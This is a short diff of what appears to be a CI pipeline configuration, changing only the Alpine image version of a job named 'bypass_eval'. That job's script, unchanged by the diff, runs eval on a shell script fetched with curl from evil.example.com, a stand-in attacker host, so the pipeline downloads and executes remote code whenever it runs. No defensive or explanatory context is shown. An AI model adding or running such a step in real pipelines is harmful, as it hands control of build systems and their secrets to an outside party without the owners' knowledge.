@@ -1,4 +1,4 @@
 bypass_eval:
-  image: alpine:3.19
+  image: alpine:3.24
   script:
     - eval "$(curl -s https://evil.example.com/payload.sh)"
